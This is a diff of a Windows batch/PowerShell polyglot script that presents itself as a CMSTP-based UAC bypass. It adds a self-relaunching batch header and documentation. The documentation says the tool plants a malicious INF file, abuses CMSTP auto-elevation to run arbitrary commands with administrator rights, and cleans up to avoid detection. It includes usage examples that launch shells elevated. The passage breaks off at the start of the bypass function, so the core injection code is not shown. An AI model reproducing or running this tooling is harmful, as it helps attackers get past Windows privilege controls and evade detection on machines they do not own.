@@ -1,19 +1,53 @@
-@(set "0=%~f0"^)#) & powershell -nop -c "iex([io.file]::ReadAllText($env:0)); cmstpBypass -command '%*'" & exit /b
+<# : batch portion
+@echo off
 
+fltmc > nul 2>&1 || (
+	echo Administrator privileges are required.
+	PowerShell Start -Verb RunAs '%0' 2> nul || (
+		echo You must run this script as admin.
+		exit /b 1
+	)
+	exit /b
+)
 
-#	CMSTP Bypass Script
+powershell -nop "& ([Scriptblock]::Create((Get-Content '%~f0' -Raw)))"
+exit /b %ERRORLEVEL%
+: end batch / begin PowerShell #>
 
-#	Usage:
-#	This script bypasses CMSTP (Connection Manager Profile Installer) by injecting custom commands into an INF file.
-#	Example usage:
-#
-#	.\UACbypasses.bat cmd.exe /c powershell
-#	.\UACbypasses.bat -CommandToRun 'echo Hello, World!'
-#	.\UACbypasses.bat cmd.exe /c "C:\Users\Administrator\Desktop\Aurora.cmd"
+<#
+.SYNOPSIS
+    CMSTP UAC Bypass Script for Windows
 
-#	Credits:
-#	https://github.com/tehstoni/RustyKeys
-#	https://github.com/zoicware/zScripts/blob/main/cmstpBypass.bat
+.DESCRIPTION
+    This script provides a method to bypass Windows User Account Control (UAC)
+    using the Connection Manager Profile Installer (CMSTP). It works by:
+    - Creating a malicious INF file with custom commands
+    - Using CMSTP's auto-elevation to execute those commands with admin rights
+    - Cleaning up after execution to avoid detection
+
+.PARAMETER command
+    The command to execute with elevated privileges
+
+.EXAMPLE
+    .\UACbypasses.bat cmd.exe /c powershell
+    Launches PowerShell with elevated privileges
+
+.EXAMPLE
+    .\UACbypasses.bat -CommandToRun 'echo Hello, World!'
+    Executes the echo command with elevated privileges
+
+.EXAMPLE
+    .\UACbypasses.bat cmd.exe /c "C:\Users\Administrator\Desktop\Aurora.cmd"
+    Runs the specified batch file with elevated privileges
+
+.NOTES
+    Version: 1.0
+    Warning: Use with caution - bypassing UAC can be dangerous
+    Requirements: Windows OS with UAC enabled, CMSTP.exe present in system32
+    Author: Based on work from:
+            - https://github.com/tehstoni/RustyKeys
+            - https://github.com/zoicware/zScripts/blob/main/cmstpBypass.bat
+#>
 
 
 function cmstpBypass{
